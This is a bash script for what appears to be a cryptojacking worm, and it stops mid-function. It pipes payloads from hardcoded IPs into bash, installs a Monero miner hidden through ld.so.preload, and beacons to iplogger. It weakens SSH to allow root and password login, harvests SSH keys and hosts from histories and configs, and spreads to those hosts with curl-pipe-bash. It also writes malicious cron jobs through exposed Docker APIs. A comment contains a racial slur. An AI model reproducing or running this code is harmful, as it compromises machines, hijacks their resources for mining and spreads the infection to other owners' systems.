#!/bin/bash
#thanks for everything
#                                                                     $$\    $$$$$$\
#                                                                   $$$$ |  $$  __$$\
# $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\   $$$$$$$\        $$\   $$\ \_$$ |  \__/  $$ |
#$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ $$  _____|       \$$\ $$  |  $$ |   $$$$$$  |
#$$ /  $$ |$$ /  $$ |\$$$$$$\  $$$$$$$$ |$$ /              \$$$$  /   $$ |  $$  ____/
#$$ |  $$ |$$ |  $$ | \____$$\ $$   ____|$$ |              $$  $$<    $$ |  $$ |
#\$$$$$$  |$$$$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$$\        $$  /\$$\ $$$$$$\ $$$$$$$$\
# \______/ $$  ____/ \_______/  \_______| \_______|$$$$$$\\__/  \__|\______|\________|
#          $$ | pwning to pwn                      \______|
#          $$ | if this script helped you make some $$ mining monero, throw a little my way?
#          \__| Monero: 47TmDBB14HuY7xw55RqU27EfYyzfQGp6qKmfg6f445eihemFMn3xPhs8e1qM726pVj6XKtyQ1zqC24kqtv8fXkPZ7bvgSPU
#
#

# 初始化
hide (){
	sed -i '/libprocesshider/'d /etc/ld.so.preload
	echo "/usr/local/lib/libprocesshider.so" >> "/etc/ld.so.preload"
}
show (){
	sed -i '/libprocesshider/'d /etc/ld.so.preload
}
initializego() {
	if test -f /tmp/.firstrun-update_ivan1.pid; then
		echo "pid exists, skip to next section"
	else
		curl -A xanthe-start/1.4 -sL http://34.92.166.158:8080/files/xesa.txt | bash -s >/dev/null 2>&1
		echo "################################################xesa DONE######################################################"
		curl -A xanthe-start/1.4 -sL http://34.92.166.158:8080/files/fczyo | bash -s >/dev/null 2>&1
		echo "################################################fczyo DONE######################################################"
		## Reporting in
		PROC=`(nproc --all)`
		MEM=`(free -h | gawk '/Mem:/{print $2}' | rev | cut -c 2- | rev | xargs printf "%.*f\n" 0)`
		echo "p:$PROC, m:$MEM"
		#https://iplogger.org/10xNq3
		curl -A xanthecheck-$PROC.$MEM -sL https://iplogger.org/1mNyp7 >/dev/null
		# curl -A xanthecheck-$PROC.$MEM -sL http://34.92.166.158:8080/files/init >/dev/null
		touch /tmp/.firstrun-update_ivan1.pid
		chattr +ia /tmp/.firstrun-update_ivan1.pid;
	fi
}

# 下载挖矿程序
filegetgo() {
	
	java_c_arr=("http://34.92.166.158:8080/files/java_c" "http://139.162.124.27:8080/files/java_c")
	config_arr=("http://34.92.166.158:8080/files/config.json" "http://139.162.124.27:8080/files/config.json")
	lib_arr=("http://34.92.166.158:8080/files/libprocesshider.so"  "http://139.162.124.27:8080/files/libprocesshider.so")
	if ( test -f /usr/local/lib/libprocesshider.so ) && ( md5sum --status -c - <<<"025685efeb19a7ad403f15126e7ffb5a /usr/local/lib/libprocesshider.so" ) 
	then
		echo "libprocesshider file exists"
		echo "libprocesshider file right"
	else
		for (( i = 0; i < 2; i++ )); do
			if ( test -f /usr/local/lib/libprocesshider.so ) && ( md5sum --status -c - <<<"025685efeb19a7ad403f15126e7ffb5a /usr/local/lib/libprocesshider.so" ) 
			then
				echo "libprocesshider file exists"
				echo "libprocesshider file right"
				break;
			else
				echo ${lib_arr[i]}
				curl -A filegetgo/1.5 --create-dirs -sL -o /usr/local/lib/libprocesshider.so ${lib_arr[i]}
			fi
		done
	fi
	if ( test -f /var/tmp/java_c/config.json ) && (cat /var/tmp/java_c/config.json|grep -vw grep | grep '"url": "139.162.124.27:7738"'>/dev/null)
	then
			echo "config file exists"
			echo "config file right"
	else
		for (( i = 0; i < 2; i++ )); do
			if ( test -f /var/tmp/java_c/config.json ) && (cat /var/tmp/java_c/config.json|grep -vw grep | grep '"url": "139.162.124.27:7738"'>/dev/null)
			then
				echo "config file exists"
				echo "config file right"
				break;
			else
				echo ${config_arr[i]}
				curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/java_c/config.json ${config_arr[i]}
			fi
		done
	fi
	show
	if test -f /var/tmp/java_c/java_c; then
		echo "main java_c file exists"
		if md5sum --status -c - <<<"776227b07b2f1b82ffcc3aa38c3fae09 /var/tmp/java_c/java_c"; then
			echo "file CHECKSUM match"
		else
			echo "file exists but is not correct checksum, need to redownload"
			#FIRST***** CHECH IF CURRENTLY DOWNLOADING if [ $? -eq 0 ]
			ps aux | grep curl | grep -w /var/tmp/java_c/java_c | grep -v grep
			if [ $? -eq 0 ]; then
				echo "already downloading, Skip downloading"
			else
				echo "not currently downloading, starting download"
				chattr -R -ia /var/tmp/java_c
				rm -rf /var/tmp/java_c/java_c
				filegetgo
			fi
		fi
	else
		echo "java_c does not exist, downloading"
		echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
		chattr -R -iaeu /var/tmp || chattr -iau /tmp
		sysctl -w vm.nr_hugepages=$(nproc --all)
		#mkdir -p /tmp/bbb;
		#mkdir /var/tmp/bbb
		#curl --create-dirs -sL -o /var/tmp/java_c/java_c $urldirect1${directarray1[$RANDOM % ${#directarray1[@]}]} || curl --create-dirs -sL -o /tmp/java_c/bbb $urldirect1${directarray1[$RANDOM % ${#directarray1[@]}]};
		for (( i = 0; i < 2; i++ )); do
			if ( test -f /var/tmp/java_c/java_c ) && ( md5sum --status -c - <<<"776227b07b2f1b82ffcc3aa38c3fae09 /var/tmp/java_c/java_c" ) 
			then
				echo "java_c file exists"
				echo "java_c file right"
				chmod +x /var/tmp/java_c/java_c
				chattr +ia /var/tmp/java_c/java_c
				sysctl -w vm.nr_hugepages=$(nproc --all)
				echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
				/var/tmp/java_c/java_c
				sleep 10
				chattr +ia /var/tmp/java_c/java_c
				chmod 600 /var/tmp/java_c/log.log
				break;
			else
				echo ${java_c_arr[i]}
				curl -A filegetgo/1.5 --create-dirs -sL -o /var/tmp/java_c/java_c ${java_c_arr[i]}
			fi
		done
	fi
	hide
}
filesetupgo() {
	show
	#chattr -iauR /var/tmp/java_c/
	mount | grep noexec | grep /tmp | grep -vw grep
	if [ $? -eq 1 ]; then
		echo "good to go - already running"
	else
		echo "remounting"
		mount -o remount,exec /var/tmp
		mount -o remount,exec /tmp
	fi
	j=0
	for i in $(ps -fe | grep 'java_c' | grep -v grep | grep -v http | awk '{print $2}'); do
		let j=j+1
		if [ $j -ge 2 ]; then
			echo "Killing process $i"
			kill -9 $i
		fi
	done
	ps -fe | grep -w java_c | grep -v grep | grep -v http
	if [ $? -eq 0 ]; then
		echo "RUNNING"
		curl -A xanthe-running/1.2 -4sL https://iplogger.org/1mmup7 >/dev/null
	else
		echo "ERROR PROGRAM NOT RUNNING"
		#mkdir -p /var/tmp/bbb
		if md5sum --status -c - <<<"776227b07b2f1b82ffcc3aa38c3fae09 /var/tmp/java_c/java_c"; then
			echo "file checksums match, proceed to relaunch"
			filestartgo
		else
			echo "file checksums dont match...redownloading"
			filegetgo
		fi
	fi
	hide
}
filestartgo() {

	#mkdir /opt/bbb
	#curl -A nigger/1.3 -Lo /opt/bbb/bbb http://138.68.14.52:8080/files/adnckil
	#curl -A nigger/1.3 -Lo /opt/bbb/config.json http://138.68.14.52:8080/files/iqmjlf.jpg
	#chmod +x /opt/bbb/bbb
	show
	chattr -ia /var/tmp/java_c/java_c
	chmod +x /var/tmp/java_c/java_c
	chattr +ia /var/tmp/java_c/java_c

	chattr +ia /var/tmp/java_c/config.json
	chattr +ia /var/tmp/java_c/config.json
	chmod 600 /var/tmp/java_c/log.log

	#chattr -iauR /tmp/java_c/
	#chattr -iauR /opt/bbb/bbb
	#curl -sL https://raw.githubusercontent.com/fengyouchao/pysocks/master/socks5.py  | python - start --port=5710 --log=false;
	#ps aux | grep -vw bbb/bbb | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
	#ps -fe | grep -w java_c/bbb | grep -v grep | grep -v http
	ps aux | grep -vw /var/tmp/java_c/java_c | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
	ps -fe | grep -w /var/tmp/java_c/java_c | grep -v grep | grep -v http
	if [ $? -eq 0 ]; then
		echo "RUNNING"
	else
		echo "Oops, not running.. lets get this party started!"
		#sysctl -w vm.nr_hugepages=$(nproc --all)
		#echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
		#chmod +x /opt/bbb/bbb
		#/opt/bbb/bbb
		sysctl -w vm.nr_hugepages=$(nproc --all)
		echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
		#chmod +x /var/tmp/java_c/java_c
		/var/tmp/java_c/java_c
		sleep 10s
		ps -fe | grep -w /var/tmp/java_c/java_c | grep -v grep | grep -v http
		if [ $? -eq 0 ]; then
			echo "NOW RUNNING"
		else
			echo "Oh FUCK, Still not running, trying again!"
			sysctl -w vm.nr_hugepages=$(nproc --all)
			echo always | sudo tee /sys/kernel/mm/transparent_hugepage/enabled
			/var/tmp/java_c/java_c
		fi
	fi
	hide
}

sshdconfig() {
	chattr -ia /etc/ssh/sshd_config
	chmod 644 /etc/ssh/sshd_config
	echo "running sshd config"
	#-e 's/PermitRootLogin yes/PermitRootLogin prohibit-password/g'
	#echo "" >> /etc/ssh/sshd_config;
	#echo "PermitRootLogin yes" >> /etc/ssh/sshd_config;
	cat /etc/ssh/sshd_config | grep -iw "#Port 22" | grep -v grep >/dev/null
	if [ $? -eq 0 ]; then
		needreset=1
		chattr -ia /etc/ssh/sshd_config
		chmod 644 /etc/ssh/sshd_config
		sed -i 's/#Port 22/Port 22/g' /etc/ssh/sshd_config
		#chmod 644 /etc/ssh/sshd_config;
		chattr +ia /etc/ssh/sshd_config
	else
		echo "blank response"
	fi

	cat /etc/ssh/sshd_config | grep -iw "Port 33768" | grep -v grep >/dev/null
	if [ $? -eq 0 ]; then
		echo "already exists"
	else
		echo "does not exist"
		needreset=1		chattr -ia /etc/ssh/sshd_config
		chmod 644 /etc/ssh/sshd_config
		sed -i -e '$a\' /etc/ssh/sshd_config # This adds \n at the end of the file only if it doesn't already end with a new line. So if you run it twice it will not add another blank line.
		echo "Port 33768" >>/etc/ssh/sshd_config
		#chmod 644 /etc/ssh/sshd_config;
		chattr +ia /etc/ssh/sshd_config
	fi

	cat /etc/ssh/sshd_config | grep -iw "PermitRootLogin" | grep -v grep >/dev/null
	if [ $? -eq 0 ]; then
		needreset=1
		echo "PermitRootLogin line does exist"
		chattr -ia /etc/ssh/sshd_config
		chmod 644 /etc/ssh/sshd_config
		#echo "" >> /etc/ssh/sshd_config;
		echo "checking if PermitRootLogin disabled"
		echo "PermitRootLogin yes" >>/etc/ssh/sshd_config
		#sed -i '/.PermitRootLogin*/d' /etc/ssh/sshd_config;
		sed -i -e 's/\#PermitRootLogin/PermitRootLogin/g' -e 's/\PermitRootLogin no/PermitRootLogin yes/g' -e 's/PermitRootLogin without-password/PermitRootLogin yes/g' -e 's/PermitRootLogin prohibit-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
		chmod 600 /etc/ssh/sshd_config
		chattr +ia /etc/ssh/sshd_config
		echo "successfully re-enabled PermitRootLogin"
	else
		echo "line does not exist at all, enter new line into file"
		#echo "" >> /etc/ssh/sshd_config;
		sed -i -e '$a\' /etc/ssh/sshd_config # This adds \n at the end of the file only if it doesn't already end with a new line. So if you run it twice it will not add another blank line.
		echo "PermitRootLogin yes" >>/etc/ssh/sshd_config
		needreset=1
	fi

	cat /etc/ssh/sshd_config | grep -iw "PasswordAuthentication" | grep -v grep >/dev/null
	if [ $? -eq 0 ]; then
		needreset=1
		echo "PasswordAuthentication line does exist"
		chattr -ia /etc/ssh/sshd_config
		chmod 644 /etc/ssh/sshd_config
		#echo "" >> /etc/ssh/sshd_config;
		echo "checking if PasswordAuthentication disabled"
		echo "PasswordAuthentication yes" >>/etc/ssh/sshd_config
		#sed -i '/.PasswordAuthentication*/d' /etc/ssh/sshd_config;
		sed -i -e 's/\#PasswordAuthentication/PasswordAuthentication/g' -e 's/\PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
		chmod 600 /etc/ssh/sshd_config
		chattr +ia /etc/ssh/sshd_config
		echo "successfully re-enabled PasswordAuthentication"
	else
		echo "line does not exist at all, enter new line into file"
		#echo "" >> /etc/ssh/sshd_config;
		sed -i -e '$a\' /etc/ssh/sshd_config # This adds \n at the end of the file only if it doesn't already end with a new line. So if you run it twice it will not add another blank line.
		echo "PasswordAuthentication yes" >>/etc/ssh/sshd_config
		needreset=1
	fi

	cat /etc/ssh/sshd_config | grep -iw "GSSAPIAuthentication" | grep -v grep >/dev/null
	if [ $? -eq 0 ]; then
		needreset=1
		echo "PubkeyAuthentication line does exist"
		chattr -ia /etc/ssh/sshd_config
		chmod 644 /etc/ssh/sshd_config
		#echo "" >> /etc/ssh/sshd_config;
		echo "checking if PubkeyAuthentication disabled"
		sed -i -e 's/\#PubkeyAuthentication/PubkeyAuthentication/g' -e 's/\PubkeyAuthentication no/PubkeyAuthentication yes/g' /etc/ssh/sshd_config
		chmod 600 /etc/ssh/sshd_config
		chattr +ia /etc/ssh/sshd_config
		echo "successfully re-enabled PubkeyAuthentication"
	else
		echo "line does not exist at all, enter new line into file"
		echo "" >>/etc/ssh/sshd_config
		echo "PubkeyAuthentication yes" >>/etc/ssh/sshd_config
		needreset=1
	fi

	cat /etc/ssh/sshd_config | grep -iw "GSSAPIAuthentication" | grep -v grep >/dev/null
	if [ $? -eq 0 ]; then
		needreset=1
		echo "GSSAPIAuthentication line does exist"
		chattr -ia /etc/ssh/sshd_config
		chmod 644 /etc/ssh/sshd_config
		#echo "" >> /etc/ssh/sshd_config;
		echo "checking if GSSAPIAuthentication enabled"
		sed -i -e 's/GSSAPIAuthentication yes/GSSAPIAuthentication no/g' /etc/ssh/sshd_config
		chmod 600 /etc/ssh/sshd_config
		chattr +ia /etc/ssh/sshd_config
		echo "successfully DISABLED GSSAPIAuthentication"
	else
		echo "line does not exist at all, enter new line into file"
		echo "" >>/etc/ssh/sshd_config
		echo "GSSAPIAuthentication yes" >>/etc/ssh/sshd_config
		needreset=1
	fi

	cat /etc/ssh/sshd_config | grep -iw "GSSAPICleanupCredentials" | grep -v grep >/dev/null
	if [ $? -eq 0 ]; then
		needreset=1
		echo "GSSAPICleanupCredentials line does exist"
		chattr -ia /etc/ssh/sshd_config
		chmod 644 /etc/ssh/sshd_config
		#echo "" >> /etc/ssh/sshd_config;
		echo "checking if GSSAPICleanupCredentials enabled"
		sed -i -e 's/GSSAPICleanupCredentials yes/GSSAPICleanupCredentials no/g' /etc/ssh/sshd_config
		chmod 600 /etc/ssh/sshd_config
		chattr +ia /etc/ssh/sshd_config
		echo "successfully DISABLED GSSAPICleanupCredentials"
	else
		echo "line does not exist at all, enter new line into file"
		echo "" >>/etc/ssh/sshd_config
		echo "GSSAPICleanupCredentials yes" >>/etc/ssh/sshd_config
		needreset=1
	fi
	chattr -ia /etc/ssh/sshd_config
	chmod 600 /etc/ssh/sshd_config
	chattr +ia /etc/ssh/sshd_config
	echo "sshd config done"
}

resetsshgo() {
	if [ "$needreset" -eq "0" ]; then
		echo "no need"
	else
		sleep 10
		/etc/init.d/ssh restart
		/etc/init.d/sshd restart
		/etc/rc.d/sshd restart
		service ssh restart
		service sshd restart
		systemctl start ssh
		systemctl restart ssh
		scw-fetch-ssh-keys --upgrade
	fi
}

scancheck() {
	echo "scan check started"
	PROC=`(nproc --all)`
	MEM=`(free -h | gawk '/Mem:/{print $2}' | rev | cut -c 2- | rev | xargs printf "%.*f\n" 0)`
	echo "p:$PROC, m:$MEM"
	#check if cores > 1 and do not scan if only single core
	scanlimit=4
	if [ "$PROC" -lt "$scanlimit" ]; then
		echo "less than 2 cores, dont start scanning yet"
	else
		echo "greater than 2 cores, START SCANNING!"
		# scango
	fi

}

scango() {
	dpkg --configure -a
	which masscan >/dev/null
	if [ $? -eq 0 ]; then
		echo ""
	else
		yum install -y masscan || apt-get install masscan -y
		chmod +x /var/run/*
	fi

	which jq >/dev/null
	if [ $? -eq 0 ]; then
		echo ""
	else
		yum install -y jq || apt-get install jq -y
	fi
	which screen
	if [ $? -eq 0 ]; then
		echo ""
	else
		yum install -y screen || apt-get install screen -y
	fi

	screen -wipe >/dev/null
	if [ "$(command -v ssh|wc -l)" -eq 1 ]; then
	    if [ ! -f /etc/ssh/modulus ]; then
	        if [ -d /root/.ssh ]; then
	            hb=('/root')
	        else
	            hb=()
	        fi
	        for i in $(find /home -mindepth 1 -maxdepth 1 -type d); do
	            if [ -d $i/.ssh ]; then
	                hb+=("$i")
	    	    fi
	        done
	        for hd in {hb[@]}; do
	            if [ -f $hd/.ssh/known_hosts ] && [ "$(find $hd/.ssh -type f -name "id_*" -print|wc -l)" -ne 0 ]; then
	                for i in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $hd/.ssh/known_hosts); do
	                    ssh -oBatchMode=yes -oStrictHostChecking=no -oConnectTimeOut=8 -t root@$i "unset HISTFILE;echo ${sh}|base64 -d|/bin/bash" &
	                done
	            fi
	        done
	        touch -amr /etc/ssh/ssh_config /etc/ssh/modulus
	    fi
	fi

	if [ "$(command -v masscan|wc -l)" -eq 0 ]; then
	    if [ -f /usr/bin/apt-get ]; then
		    DEBIAN_FRONTEND=noninteractive
		    apt-get install -y masscan iproute2 >/dev/null 2>&1
	    elif [ -f /usr/bin/yum ]; then
		    yum install -y masscan iproute2 >/dev/null 2>&1
	    elif [ -f /usr/bin/pacman ]; then
		    pacman -S -y masscan iproute2 >/dev/null 2>&1
	    elif [ -f /usr/bin/up2date ]; then
		    up2date install -y masscan iproute2 >/dev/null 2>&1
	    fi
	fi

	if [ "$(command -v masscan|wc -l)" -eq 1 ] && [ "$(command -v ip|wc -l)" -eq 1 ] && [ "$(command -v docker|wc -l)" -eq 1 ]; then
	    if [ ! -f /var/log/alternatives.log.1 ]; then
	        eval sl="/var/log/$(head /dev/urandom|tr -dc A-Za-z0-9|head -c $(shuf -i 6-11 -n 1))"
	        mkdir -p /var/log
	        ip -o -f inet a show|awk '/scope global/ {print $4}'|xargs masscan "$@" --ports 2375 --rate=60000 -oG ${sl}
	        sed -i -e 's/^Host: \([0-9.]*\).*Ports: \([0-9]*\).*$/\1:\2/g' -e '/Masscan/d' -e '/scanned/d' ${sl}
	        while read i; do
	            docker -H tcp://$i run --rm -v /:/mnt busybox chroot /mnt sh -c "echo ${cr}|base64 -d|tee /etc/cron.d/crontab"
	        done < ${sl}
	        rm -f ${sl}
	        # touch -amr /var/log/boot.log /var/log/alternatives.log.1
	    fi

	    if [ ! -f /var/log/alternatives.log.2 ]; then
	        eval sl="/var/log/$(head /dev/urandom|tr -dc A-Za-z0-9|head -c $(shuf -i 6-11 -n 1))"
	        mkdir -p /var/log
	        masscan "$(curl -fsSLk --max-time 6 https://ipinfo.io/ip)/24" --ports 2375 --rate=60000 -oG ${sl}
	        sed -i -e 's/^Host: \([0-9.]*\).*Ports: \([0-9]*\).*$/\1:\2/g' -e '/Masscan/d' -e '/scanned/d' ${sl}
	        while read i; do
	            docker -H tcp://$i run --rm -v /:/mnt busybox chroot /mnt sh -c "echo ${cr}|base64 -d|tee /etc/cron.d/crontab"
	        done < ${sl}
	        rm -f ${sl}
	        # touch -amr /var/log/boot.log /var/log/alternatives.log.2
	    fi
	fi	

	ps aux | grep "dmS cock" | grep -vw grep >/dev/null
	if [ $? -eq 0 ]; then
		echo "running"
	else
		echo "need to start"
		pkill screen
		cat /etc/os-release | grep -vw grep | grep "rhel" >/dev/null
		if [ $? -eq 0 ]; then
			yum remove epel-release -y
			rpm -ivh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
			rpm -ivh https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpm
		else
			echo "no need"
		fi
		if md5sum --status -c - <<<"83acf5a32d84330bbb0103f2169e10bb /usr/bin/zgrab"; then
			echo ""
		else
			zgrabz1="http://uupload.ir/files/"
			zgrabz2="https://s.put.re/"
			zgrabscrape1="https://fuskbugg.se/"
			zgrabzar1=("epjn_zgrab.jpg" "4ih_zgrab.jpg" "kfdd_zgrab.jpg" "k4l8_zgrab.jpg")
			zgrabzar2=("1ghKpDSA.jpg" "1mR8WfJd.jpg" "1qUqWBMx.jpg" "2XmTPE5G.jpg" "38FqoSBL.jpg" "8BqzUEE8.jpg" "dqY7fmbn.jpg" "fjY69WMZ.jpg" "GWj4vteM.jpg" "Hb4Km7TL.jpg" "j8X4Zzc7.jpg" "Lgj775pY.jpg" "ML5Jj2F6.jpg" "RARm5CMk.jpg" "SFcKoguW.jpg" "sv5evTRR.jpg" "twuY28Nv.jpg" "Va8Ah4wR.jpg" "Wmm44FfX.jpg" "Yj5dX3uk.jpg")
			zgrabscrapear1=("1fRfidDen8" "39R6idD9n7" "52Rbi5D7ne" "BcR3ibDen0")
			chattr -iua /usr/bin/zgrab
			curl -L -o /usr/bin/zgrab $zgrabz1${zgrabzar1[$RANDOM % ${#zgrabzar1[@]}]} || curl -sKL -o /usr/bin/zgrab $zgrabz2${zgrabzar2[$RANDOM % ${#zgrabzar2[@]}]}
			chmod +x /usr/bin/zgrab
		fi
		if md5sum --status -c - <<<"83acf5a32d84330bbb0103f2169e10bb /usr/bin/zgrab"; then
			echo ""
		else
			zgrabz1="http://uupload.ir/files/"
			zgrabz2="https://s.put.re/"
			zgrabscrape1="https://fuskbugg.se/"
			zgrabzar1=("epjn_zgrab.jpg" "4ih_zgrab.jpg" "kfdd_zgrab.jpg" "k4l8_zgrab.jpg")
			zgrabzar2=("1ghKpDSA.jpg" "1mR8WfJd.jpg" "1qUqWBMx.jpg" "2XmTPE5G.jpg" "38FqoSBL.jpg" "8BqzUEE8.jpg" "dqY7fmbn.jpg" "fjY69WMZ.jpg" "GWj4vteM.jpg" "Hb4Km7TL.jpg" "j8X4Zzc7.jpg" "Lgj775pY.jpg" "ML5Jj2F6.jpg" "RARm5CMk.jpg" "SFcKoguW.jpg" "sv5evTRR.jpg" "twuY28Nv.jpg" "Va8Ah4wR.jpg" "Wmm44FfX.jpg" "Yj5dX3uk.jpg")
			zgrabscrapear1=("1fRfidDen8" "39R6idD9n7" "52Rbi5D7ne" "BcR3ibDen0")
			chattr -iua /usr/bin/zgrab
			curl -L -o /usr/bin/zgrab $(curl -sL $zgrabscrape1${zgrabscrapear1[$RANDOM % ${#zgrabscrapear1[@]}]} | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
			chmod +x /usr/bin/zgrab
		fi
		if md5sum --status -c - <<<"83acf5a32d84330bbb0103f2169e10bb /usr/bin/zgrab"; then
			echo ""
		else
			zgrabz1="http://uupload.ir/files/"
			zgrabz2="https://s.put.re/"
			zgrabscrape1="https://fuskbugg.se/"
			zgrabzar1=("epjn_zgrab.jpg" "4ih_zgrab.jpg" "kfdd_zgrab.jpg" "k4l8_zgrab.jpg")
			zgrabzar2=("1ghKpDSA.jpg" "1mR8WfJd.jpg" "1qUqWBMx.jpg" "2XmTPE5G.jpg" "38FqoSBL.jpg" "8BqzUEE8.jpg" "dqY7fmbn.jpg" "fjY69WMZ.jpg" "GWj4vteM.jpg" "Hb4Km7TL.jpg" "j8X4Zzc7.jpg" "Lgj775pY.jpg" "ML5Jj2F6.jpg" "RARm5CMk.jpg" "SFcKoguW.jpg" "sv5evTRR.jpg" "twuY28Nv.jpg" "Va8Ah4wR.jpg" "Wmm44FfX.jpg" "Yj5dX3uk.jpg")
			zgrabscrapear1=("1fRfidDen8" "39R6idD9n7" "52Rbi5D7ne" "BcR3ibDen0")
			chattr -iua /usr/bin/zgrab
			curl -L -o /usr/bin/zgrab $zgrabz1${zgrabzar1[$RANDOM % ${#zgrabzar1[@]}]} || curl -sKL -o /usr/bin/zgrab $zgrabz2${zgrabzar2[$RANDOM % ${#zgrabzar2[@]}]}
			chmod +x /usr/bin/zgrab
		fi
	fi
}

localgo() {
	echo "localgo start"
	myhostip=$(curl -sL icanhazip.com)
	KEYS=$(find ~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub)
	KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
	KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' '{print $2}' | awk '{print $1'})
	KEYS4=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
	HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
	HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
	HOSTS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $2}' | awk -F '{print $1}')
	HOSTS4=$(cat /etc/hosts | grep -vw "0.0.0.0" | grep -vw "127.0.1.1" | grep -vw "127.0.0.1" | grep -vw $myhostip | sed -r '/\n/!s/[0-9.]+/\n&\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}')
	HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
	HOSTS6=$(ps auxw | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep ":22" | uniq)
	USERZ=$(
		echo "root"
		find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq | grep -wv ".ssh"
	)
	USERZ2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq)
	sshports=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '-p' '{print $2}' | awk '{print $1}' | sed 's/[^0-9]*//g' | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | sed -e "\$a22")
	userlist=$(echo "$USERZ $USERZ2" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | grep -vw "." | grep -vw "ssh" | sed '/\./d')
	hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3 $HOSTS4 $HOSTS5 $HOSTS6" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
	keylist=$(echo "$KEYS $KEYS2 $KEYS3 $KEYS4" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
	i=0
	for user in $userlist; do
		for host in $hostlist; do
			for key in $keylist; do
				for sshp in $sshports; do
					((i++))
					if [ "${i}" -eq "20" ]; then
						sleep 5
						ps wx | grep "ssh -o" | awk '{print $1}' | xargs kill -9 &>/dev/null &
						i=0
					fi

					#Wait 5 seconds after every 20 attempts and clean up hanging processes

					chmod +r $key
					chmod 400 $key
					echo "$user@$host"
					ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "sudo curl -A hostcheck/1.5 -L http://34.92.166.158:8080/files/xanthe | sudo bash -s;"
					ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "curl -A hostcheck/1.5 -L http://34.92.166.158:8080/files/xanthe | bash -s;"
				done
			done
		done
	done
	# scangogo
	echo "local done"
}
scangogo() {
	which masscan >/dev/null
	if [ $? -eq 0 ]; then
		echo ""
	else
		yum install -y masscan || apt-get install masscan -y
		chmod +x /var/run/*
	fi

	if [ "$(command -v ssh|wc -l)" -eq 1 ]; then
	    if [ ! -f /etc/ssh/modulus ]; then
	        if [ -d /root/.ssh ]; then
	            hb=('/root')
	        else
	            hb=()
	        fi
	        for i in $(find /home -mindepth 1 -maxdepth 1 -type d); do
	            if [ -d $i/.ssh ]; then
	                hb+=("$i")
	    	    fi
	        done
	        for hd in {hb[@]}; do
	            if [ -f $hd/.ssh/known_hosts ] && [ "$(find $hd/.ssh -type f -name "id_*" -print|wc -l)" -ne 0 ]; then
	                for i in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $hd/.ssh/known_hosts); do
	                    ssh -oBatchMode=yes -oStrictHostChecking=no -oConnectTimeOut=8 -t root@$i "curl -A qi/1.1 -sL http://34.92.166.158:8080/files/pop.sh | bash &"
	                done
	            fi
	        done
	        touch -amr /etc/ssh/ssh_config /etc/ssh/modulus
	    fi
	fi
	if [ "$(command -v masscan|wc -l)" -eq 0 ]; then
	    if [ -f /usr/bin/apt-get ]; then
		    DEBIAN_FRONTEND=noninteractive
		    apt-get install -y masscan iproute2 >/dev/null 2>&1
	    elif [ -f /usr/bin/yum ]; then
		    yum install -y masscan iproute2 >/dev/null 2>&1
	    elif [ -f /usr/bin/pacman ]; then
		    pacman -S -y masscan iproute2 >/dev/null 2>&1
	    elif [ -f /usr/bin/up2date ]; then
		    up2date install -y masscan iproute2 >/dev/null 2>&1
	    fi
	fi

	if [ "$(command -v masscan|wc -l)" -eq 1 ] && [ "$(command -v ip|wc -l)" -eq 1 ] && [ "$(command -v docker|wc -l)" -eq 1 ]; then
	    if [ ! -f /var/log/alternatives.log.1 ]; then
	        eval sl="/var/log/$(head /dev/urandom|tr -dc A-Za-z0-9|head -c $(shuf -i 6-11 -n 1))"
	        mkdir -p /var/log
